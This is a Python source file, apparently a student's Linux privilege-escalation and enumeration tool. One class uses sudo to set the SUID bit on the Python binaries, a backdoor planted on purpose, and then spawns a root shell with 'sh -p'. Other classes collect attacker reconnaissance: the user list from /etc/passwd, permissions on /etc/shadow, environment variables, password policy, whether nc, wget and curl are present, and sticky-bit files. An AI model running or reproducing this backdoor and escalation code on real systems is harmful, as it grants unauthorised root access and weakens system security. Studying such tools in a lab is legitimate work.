import subprocess
import os
import sys

class Privesc_C1:

    def create_vuln():
        """
        Function used to create the Python Vulnerability that grants us access to an higher privilege shell    
        """
        os.system("sudo sh -c 'cp $(which python) .; chmod +s /bin/python*'")

    def execute():
        """
        Function used to exploit the Python vulnerability to create a higher privilege shell
        """
        print("\033c")
        print("\033[1;36;40mPython PrivEsc, by Student C. Creates a Shell with root permissions through Python Exploit with SUID bit\033[0m")
        print()
        os.execl("/bin/sh", "sh", "-p")
    
class Enumeration_C1:

    def system_info():
        """
        Function used to display System information and to save it to a log file if the user wants

        vars:
            content: used to save the commands that were run if the user wants to save the output of them
            answer: used to save the input of the user
            directory: stores the directory to store the log file
            file_name: stores the file name of the log file
        """
        content = []
        print("\033c")
        print("\033[1;31;40m--------------------\033[0m\033[1;37;40mSYSTEM INFORMATION\033[0m\033[1;31;40m--------------------\033[0m")
        print()
        print("\033[1;31;40m-----\033[0m\033[1;37;40mKernel Information:\033[0m\033[1;31;40m-----\033[0m")
        print()
        sp=subprocess.run('uname -a', shell=True)
        print()
        print("\033[1;31;40m-----\033[0m\033[1;37;40mVersion Information:\033[0m\033[1;31;40m-----\033[0m")
        print()
        sp=subprocess.run('cat /etc/*-release', shell=True)
        print()
        print("\033[1;31;40m-----\033[0m\033[1;37;40mList of all users:\033[0m\033[1;31;40m-----\033[0m")
        print()
        sp=subprocess.run("cut -d':' -f1 /etc/passwd", shell=True)
        print()
        print("\033[1;36;40mSystem Information, by Student C. Displays some system information\033[0m")
        input("press any key to continue")

class Enumeration_C2:

    def env_info():
        """
        Function used to display Environment information and to save it to a log file if the user wants

        vars:
            content: used to save the commands that were run if the user wants to save the output of them
            answer: used to save the input of the user
            directory: stores the directory to store the log file
            file_name: stores the file name of the log file
        """
        content = []
        print("\033c")
        print("\033[1;31;40m--------------------\033[0m\033[1;37;40mENVIRONMENT INFORMATION\033[0m\033[1;31;40m--------------------\033[0m")
        print()
        print("\033[1;31;40m-----\033[0m\033[1;37;40mEnvironment Information:\033[0m\033[1;31;40m-----\033[0m")
        print()
        sp=subprocess.run("env", shell=True)
        print()
        print("\033[1;31;40m-----\033[0m\033[1;37;40mAvailable Shells:\033[0m\033[1;31;40m-----\033[0m")
        print()
        sp=subprocess.run("cat /etc/shells", shell=True)
        print()
        print("\033[1;31;40m-----\033[0m\033[1;37;40mCurrent umask value:\033[0m\033[1;31;40m-----\033[0m")
        print()
        sp=subprocess.run("umask -S; umask", shell=True)
        print()
        print("\033[1;31;40m-----\033[0m\033[1;37;40mUmask value in /etc/login.defs:\033[0m\033[1;31;40m-----\033[0m")
        print()
        sp=subprocess.run("grep -i '^UMASK' /etc/login.defs", shell=True)
        print()
        print("\033[1;31;40m-----\033[0m\033[1;37;40mPassword and password storage information:\033[0m\033[1;31;40m-----\033[0m")
        print()
        sp=subprocess.run("grep '^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD' /etc/login.defs", shell=True)
        print()
        print("\033[1;36;40mEnvironment Information, by Student C. Displays some useful environmental information like available shells\033[0m")
        input("press any key to continue")


class Enumeration_C3:

    def interesting_files():
        """
        Function used to display Information about some specific files that can be useful for the user and to save it to a log file if the user wants

        vars:
            content: used to save the commands that were run if the user wants to save the output of them
            answer: used to save the input of the user
            directory: stores the directory to store the log file
            file_name: stores the file name of the log file
        """
        content = []
        print("\033c")
        print("\033[1;31;40m--------------------\033[0m\033[1;37;40mINTERESTING FILES\033[0m\033[1;31;40m--------------------\033[0m")
        print()
        print("\033[1;31;40m-----\033[0m\033[1;37;40mUseful files locations:\033[0m\033[1;31;40m-----\033[0m")
        print()
        sp=subprocess.run("which nc; which netcat; which wget; which nmap ; which gcc; which curl",shell=True)
        print()
        print("\033[1;31;40m-----\033[0m\033[1;37;40mInstalled compilers:\033[0m\033[1;31;40m-----\033[0m")
        print()
        sp=subprocess.run("dpkg --list | grep compiler |grep -v decompiler  && yum list installed 'gcc*' | grep gcc",shell=True)
        print()
        print("\033[1;31;40m----\033[0m\033[1;37;40m-Permissions of sensitive files:\033[0m\033[1;31;40m-----\033[0m")
        print()
        sp=subprocess.run("ls -la /etc/passwd ; ls -la /etc/group ; ls -la /etc/profile ; ls -la /etc/shadow ;", shell=True) 
        print()
        sp=subprocess.getoutput("find / -perm -1000 > tmp")
        print("\033[1;31;40m-----\033[0m\033[1;37;40mFiles with Sticky Bits:\033[0m\033[1;31;40m-----\033[0m")
        print()
        sp=subprocess.run("cat tmp",shell=True)
        print()
        print("\033[1;36;40mInteresting Files, by Student C. Displays information about some sensitive files and shows out the location of important files\033[0m")
        input("press any key to continue")

